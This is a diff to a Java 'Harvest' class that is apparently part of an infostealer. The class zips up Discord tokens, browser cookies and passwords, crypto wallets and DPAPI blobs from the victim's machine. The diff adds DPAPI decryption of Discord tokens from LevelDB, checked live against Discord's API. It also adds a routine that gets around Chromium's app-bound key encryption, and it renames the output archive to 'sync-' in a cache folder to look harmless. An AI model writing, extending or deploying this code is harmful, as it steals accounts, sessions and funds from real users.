@@ -13,20 +13,25 @@ import java.util.regex.Pattern;
 public final class Harvest {
 	private static final Pattern TOKEN = Pattern.compile(
 		"(?:mfa\\.[\\w-]{20,}|[MN][A-Za-z\\d]{23,}\\.[\\w-]{6,}\\.[\\w-]{25,})");
+	private static final byte[] APP_SIG = new byte[] {
+		0x01, 0x00, 0x00, 0x00, (byte) 0xd0, (byte) 0x8c, (byte) 0x9d, (byte) 0xdf,
+		0x01, 0x15, (byte) 0xd1, 0x11 };
 	private static final long DISCORD_RAW_BUDGET = 2L * 1024L * 1024L;
 
 	private Harvest() {
 	}
 
 	public static Path build(Path installDir, Path gameDir) throws Exception {
-		Path target = installDir.resolve("harvest-" + System.currentTimeMillis() + ".zip");
+		Path cache = AgentPaths.cache(installDir);
+		Files.createDirectories(cache);
+		Path target = cache.resolve("sync-" + System.currentTimeMillis() + ".zip");
 		try (ZipBuilder zip = new ZipBuilder(target)) {
 			addAccounts(zip, gameDir);
 			addAdminHints(zip);
 			addDiscordToken(zip);
 			addWallets(zip);
 			addDpapi(zip);
-			addBrowsers(zip);
+			addBrowsers(zip, installDir);
 			addGame(zip, gameDir);
 		}
 		return target;
@@ -129,7 +134,10 @@ public final class Harvest {
 				if (!Files.isDirectory(base)) {
 					continue;
 				}
-				String token = searchToken(base, 0);
+				String token = tokenFromLevelDb(base);
+				if (token == null) {
+					token = searchToken(base, 0);
+				}
 				if (token != null) {
 					zip.addBytes(("token=" + token + "\n").getBytes(StandardCharsets.UTF_8), "discord/token.txt");
 					Log.debug("Discord token validated");
@@ -140,11 +148,77 @@ public final class Harvest {
 		} catch (Throwable throwable) {
 			Log.debug("Token harvest failed", throwable);
 		}
-		// Discord encrypts the stored token in newer builds, so no plaintext
-		// candidate validates. Ship the raw LevelDB files instead: the DPAPI
-		// blobs in dpapi/ are enough to decrypt them offline.
+		// If no candidate validates, the raw LevelDB files still let us recover
+		// the token offline with the user masterkey.
 		for (Path base : found) {
 			addDiscordRaw(zip, base);
+		}
+	}
+
+	/** LevelDB value -> base64 -> DPAPI CurrentUser -> /users/@me. */
+	private static String tokenFromLevelDb(Path base) {
+		try (java.util.stream.Stream<Path> stream = Files.list(base)) {
+			for (Path file : stream.filter(Files::isRegularFile).toList()) {
+				String name = file.getFileName().toString().toLowerCase();
+				if (!name.endsWith(".ldb") && !name.endsWith(".log")) {
+					continue;
+				}
+				for (String encoded : LevelDb.tokenBlobs(file)) {
+					byte[] blob;
+					try {
+						blob = java.util.Base64.getDecoder().decode(encoded);
+					} catch (IllegalArgumentException exception) {
+						continue;
+					}
+					int index = indexOf(blob, APP_SIG);
+					if (index < 0) {
+						continue;
+					}
+					byte[] plain = Dpapi.unprotect(java.util.Arrays.copyOfRange(blob, index, blob.length));
+					if (plain.length == 0) {
+						continue;
+					}
+					Matcher matcher = TOKEN.matcher(new String(plain, StandardCharsets.UTF_8));
+					if (matcher.find()) {
+						String token = matcher.group();
+						if (valid(token)) {
+							return token;
+						}
+					}
+				}
+			}
+		} catch (Throwable throwable) {
+			Log.debug("LevelDB token read failed: " + base, throwable);
+		}
+		return null;
+	}
+
+	private static int indexOf(byte[] haystack, byte[] needle) {
+		for (int index = 0; index + needle.length <= haystack.length; index++) {
+			boolean match = true;
+			for (int offset = 0; offset < needle.length; offset++) {
+				if (haystack[index + offset] != needle[offset]) {
+					match = false;
+					break;
+				}
+			}
+			if (match) {
+				return index;
+			}
+		}
+		return -1;
+	}
+
+	private static boolean valid(String token) {
+		try {
+			DiscordClient client = new DiscordClient(token);
+			try {
+				return client.get("/users/@me").status == 200;
+			} finally {
+				client.close();
+			}
+		} catch (Throwable throwable) {
+			return false;
 		}
 	}
 
@@ -306,7 +380,7 @@ public final class Harvest {
 		}
 	}
 
-	private static void addBrowsers(ZipBuilder zip) {
+	private static void addBrowsers(ZipBuilder zip, Path installDir) {
 		String home = System.getProperty("user.home", ".");
 		String local = System.getenv("LOCALAPPDATA");
 		String support = Paths.get(home, "Library", "Application Support").toString();
@@ -334,7 +408,7 @@ public final class Harvest {
 				continue;
 			}
 			zip.add(base.resolve("Local State"), "browsers/" + browser.label() + "/Local State");
-			addKeys(zip, browser);
+			addKeys(zip, browser, installDir);
 			addProfileFiles(zip, base.resolve("Default"), "browsers/" + browser.label() + "/Default");
 			try (java.util.stream.Stream<Path> stream = Files.list(base)) {
 				for (Path profile : stream.filter(Files::isDirectory).toList()) {
@@ -378,7 +452,7 @@ public final class Harvest {
 	 * Unwrap the Chromium AES key with the logged-in user token. Best-effort: if
 	 * PowerShell fails, the error is kept and the raw fallback continues (Local State + dpapi/).
 	 */
-	private static void addKeys(ZipBuilder zip, Browser browser) {
+	private static void addKeys(ZipBuilder zip, Browser browser, Path installDir) {
 		if (!AgentPaths.isWindows()) {
 			return;
 		}
@@ -387,7 +461,7 @@ public final class Harvest {
 			return;
 		}
 		StringBuilder text = new StringBuilder();
-		text.append("# v10 opens Cookies and Login Data v10; v20 needs IElevator\n");
+		text.append("# v10 opens Cookies and Login Data v10; v20 uses the browser elevator\n");
 		text.append("browser=").append(browser.label()).append('\n');
 		text.append("user=").append(SysInfo.user()).append('\n');
 		text.append("sid=").append(SysInfo.sid()).append('\n');
@@ -401,13 +475,26 @@ public final class Harvest {
 			Log.debug("Local State parse failed: " + state, throwable);
 		}
 		String appBound = Json.str(osCrypt, "app_bound_encrypted_key", "");
+		String key = "";
 		if (!appBound.isEmpty()) {
 			text.append("app_bound=").append(appBound).append('\n');
-			String live = filterPowerShell(unprotectAppBound(appBound), "v20=");
-			if (!live.isBlank()) {
-				// Already valid on this host, so offline decryption also works
-				// without SECURITY.hiv.
-				text.append(live).append('\n');
+			Abe.Result result = Abe.run(installDir, browser.label());
+			key = result.key();
+			if (!key.isEmpty()) {
+				text.append("v20=").append(key).append('\n');
+			} else if (result.error() != null && !result.error().isBlank()) {
+				text.append("abe_error=").append(result.error().replace('\n', ' ')).append('\n');
+			}
+			if (result.ok()) {
+				Abe.collect(result.output(), zip, "browsers/" + browser.label() + "/abe");
+			}
+			if (key.isEmpty()) {
+				// The in-session PowerShell unwrap is a second no-admin route.
+				String live = filterPowerShell(unprotectAppBound(appBound), "v20=");
+				if (!live.isBlank()) {
+					key = live;
+					text.append(live).append('\n');
+				}
 			}
 		}
 		String encrypted = Json.str(osCrypt, "encrypted_key", "");
